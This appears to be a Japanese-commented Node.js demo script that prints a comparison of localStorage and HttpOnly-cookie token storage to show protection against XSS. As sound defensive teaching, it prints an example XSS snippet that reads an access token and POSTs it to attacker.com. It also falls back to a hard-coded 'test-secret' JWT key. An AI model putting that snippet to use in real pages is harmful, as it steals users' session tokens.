/**
 * XSS保護テストスクリプト
 * LocalStorage方式とHttpOnly Cookie方式の違いを実演
 */

import { MongoClient } from 'mongodb';
import jwt from 'jsonwebtoken';

// 色付きコンソール出力
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  reset: '\x1b[0m'
};

async function testXSSProtection() {
  console.log(`${colors.blue}=== XSS保護テスト ===${colors.reset}\n`);
  
  // 1. 模擬トークンを生成
  const mockUserId = '507f1f77bcf86cd799439011';
  const JWT_SECRET = process.env.JWT_SECRET || 'test-secret';
  const mockToken = jwt.sign({ userId: mockUserId }, JWT_SECRET, { expiresIn: '24h' });
  
  console.log('📝 テスト用トークンを生成しました');
  console.log(`Token: ${mockToken.substring(0, 20)}...`);
  console.log('');
  
  // 2. LocalStorage方式のシミュレーション
  console.log(`${colors.yellow}【従来方式: LocalStorage】${colors.reset}`);
  console.log('JavaScriptでトークンを保存:');
  console.log(`${colors.red}localStorage.setItem('accessToken', '${mockToken.substring(0, 20)}...');${colors.reset}`);
  console.log('');
  console.log('XSS攻撃シミュレーション:');
  console.log(`${colors.red}// 悪意のあるスクリプトが実行された場合`);
  console.log(`const stolenToken = localStorage.getItem('accessToken');`);
  console.log(`fetch('https://attacker.com/steal', {`);
  console.log(`  method: 'POST',`);
  console.log(`  body: JSON.stringify({ token: stolenToken })`);
  console.log(`});${colors.reset}`);
  console.log(`${colors.red}⚠️  結果: トークンが盗まれました！${colors.reset}\n`);
  
  // 3. HttpOnly Cookie方式のシミュレーション
  console.log(`${colors.green}【新方式: HttpOnly Cookie】${colors.reset}`);
  console.log('サーバー側でCookieを設定:');
  console.log(`${colors.green}res.cookie('userAccessToken', token, {`);
  console.log(`  httpOnly: true,  // JavaScriptからアクセス不可`);
  console.log(`  secure: true,    // HTTPS必須`);
  console.log(`  sameSite: 'lax'  // CSRF対策`);
  console.log(`});${colors.reset}`);
  console.log('');
  console.log('XSS攻撃シミュレーション:');
  console.log(`${colors.green}// 悪意のあるスクリプトが実行されても...`);
  console.log(`const stolenToken = document.cookie; // HttpOnly Cookieは含まれない`);
  console.log(`console.log(stolenToken); // ""`);
  console.log(`${colors.green}✅ 結果: トークンは保護されています！${colors.reset}\n`);
  
  // 4. Feature Flag切り替えのデモ
  console.log(`${colors.blue}【Feature Flagによる切り替え】${colors.reset}`);
  console.log('環境変数で動作を制御:');
  console.log('');
  console.log('従来方式を使用:');
  console.log(`${colors.yellow}FEATURE_SECURE_COOKIE_AUTH=false npm run dev${colors.reset}`);
  console.log('');
  console.log('新方式を使用:');
  console.log(`${colors.green}FEATURE_SECURE_COOKIE_AUTH=true npm run dev${colors.reset}`);
  console.log('');
  
  // 5. 実際のコード例
  console.log(`${colors.blue}【実装されたコード例】${colors.reset}`);
  console.log('フロントエンド（utils/auth.ts）:');
  console.log(`${colors.green}export async function isAuthenticated(): Promise<boolean> {
  const flags = await getFeatureFlags();
  
  if (flags.SECURE_COOKIE_AUTH) {
    // HttpOnly Cookie方式: ユーザー情報の存在のみ確認
    const user = getCurrentUser();
    return !!user;
  } else {
    // 従来方式: LocalStorageのトークンを確認
    const token = getAccessToken();
    const user = getCurrentUser();
    return !!(token && user);
  }
}${colors.reset}`);
  
  console.log('\n✨ テスト完了！');
}

// メイン実行
testXSSProtection().catch(console.error);